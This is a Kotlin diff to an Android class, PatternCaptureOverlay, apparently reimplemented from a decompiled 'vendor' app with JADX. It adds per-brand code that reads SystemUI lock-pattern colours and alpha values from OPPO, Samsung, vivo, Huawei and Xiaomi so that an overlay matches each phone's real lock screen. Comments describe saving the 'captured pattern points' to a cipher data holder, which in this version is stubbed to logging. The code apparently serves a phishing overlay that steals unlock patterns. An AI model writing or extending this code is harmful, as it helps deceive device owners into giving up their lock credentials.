@@ -181,7 +181,7 @@ class PatternCaptureOverlay(
         val pathWidth = (density * 3f).toInt().coerceAtLeast(3)
         val brand = Build.BRAND
 
-        // ADAPT: 简化品牌分支，保留核心逻辑
+        // vendor: 简化品牌分支，保留核心逻辑（JADX a2 有 OPPO/Huawei/Vivo/Xiaomi/Transsion 细分）
         when {
             brand.equals("samsung", ignoreCase = true) -> {
                 view.normalStateColor = -3355444
@@ -459,12 +459,59 @@ class PatternCaptureOverlay(
 
             // 外圈透明度
             var outerAlpha = 0.1f
-            // ADAPT: OPPO 特定 alpha 资源省略
+            // vendor: OPPO 特定 alpha 资源 coui_lock_pattern_outer_circle_max_alpha
+            val oppoAlphaId = res.getIdentifier("coui_lock_pattern_outer_circle_max_alpha", "dimen", "com.android.systemui")
+            if ((brand == "oppo" || brand == "realme" || brand == "oneplus") && oppoAlphaId != 0) {
+                try {
+                    outerAlpha = if (Build.VERSION.SDK_INT >= 29) {
+                        res.getFloat(oppoAlphaId)
+                    } else {
+                        val tv = TypedValue()
+                        res.getValue(oppoAlphaId, tv, true)
+                        tv.float
+                    }
+                    Log.d(TAG, "★ OPPO outerCircleMaxAlpha=$outerAlpha")
+                } catch (e: Exception) {
+                    Log.w(TAG, "读取 outerCircleMaxAlpha 失败, 用默认值 0.1: ${e.message}")
+                }
+            }
 
             // 颜色
             var dotColor = 0
             var pathColor = 0
-            // ADAPT: 品牌特定颜色资源读取省略，使用主题兜底
+            // vendor: 品牌特定颜色资源读取
+            when {
+                brand == "oppo" || brand == "realme" || brand == "oneplus" -> {
+                    val dotId = res.getIdentifier("coui_lock_pattern_dot_color", "color", "com.android.systemui")
+                    val pathId2 = res.getIdentifier("coui_lock_pattern_path_color", "color", "com.android.systemui")
+                    if (dotId != 0) dotColor = res.getColor(dotId, suiContext.theme)
+                    if (pathId2 != 0) pathColor = res.getColor(pathId2, suiContext.theme)
+                }
+                brand.equals("samsung", ignoreCase = true) -> {
+                    val dotId = res.getIdentifier("sec_lock_pattern_dot_color", "color", "com.android.systemui")
+                    val pathId2 = res.getIdentifier("sec_lock_pattern_path_color", "color", "com.android.systemui")
+                    if (dotId != 0) dotColor = res.getColor(dotId, suiContext.theme)
+                    if (pathId2 != 0) pathColor = res.getColor(pathId2, suiContext.theme)
+                }
+                brand == "vivo" || brand == "iqoo" -> {
+                    val dotId = res.getIdentifier("vivo_lock_pattern_dot_color", "color", "com.android.systemui")
+                    val pathId2 = res.getIdentifier("vivo_lock_pattern_path_color", "color", "com.android.systemui")
+                    if (dotId != 0) dotColor = res.getColor(dotId, suiContext.theme)
+                    if (pathId2 != 0) pathColor = res.getColor(pathId2, suiContext.theme)
+                }
+                brand == "huawei" || brand == "honor" -> {
+                    val dotId = res.getIdentifier("hwlock_pattern_dot_color", "color", "com.android.systemui")
+                    val pathId2 = res.getIdentifier("hwlock_pattern_path_color", "color", "com.android.systemui")
+                    if (dotId != 0) dotColor = res.getColor(dotId, suiContext.theme)
+                    if (pathId2 != 0) pathColor = res.getColor(pathId2, suiContext.theme)
+                }
+                brand.equals("xiaomi", ignoreCase = true) || brand.equals("redmi", ignoreCase = true) -> {
+                    val dotId = res.getIdentifier("miui_lock_pattern_dot_color", "color", "com.android.systemui")
+                    val pathId2 = res.getIdentifier("miui_lock_pattern_path_color", "color", "com.android.systemui")
+                    if (dotId != 0) dotColor = res.getColor(dotId, suiContext.theme)
+                    if (pathId2 != 0) pathColor = res.getColor(pathId2, suiContext.theme)
+                }
+            }
             if (dotColor == 0) dotColor = getThemeColor()
             if (pathColor == 0) pathColor = getThemeColor()
 
@@ -503,7 +550,7 @@ class PatternCaptureOverlay(
         if (!lock.tryLock()) return
         try {
             if (save) {
-                // ADAPT: VENDOR_VERIFY — 保存逻辑: vendor saves captured pattern points to CipherDataHolder
+                // vendor: 保存逻辑 — vendor saves captured pattern points to CipherDataHolder
                 // then triggers dispatchResult on CipherCaptureManager. Simplified: log only.
                 Log.d(TAG, "stopCapture: 保存 ${capturedPoints.size} 个已捕获点")
             } else {
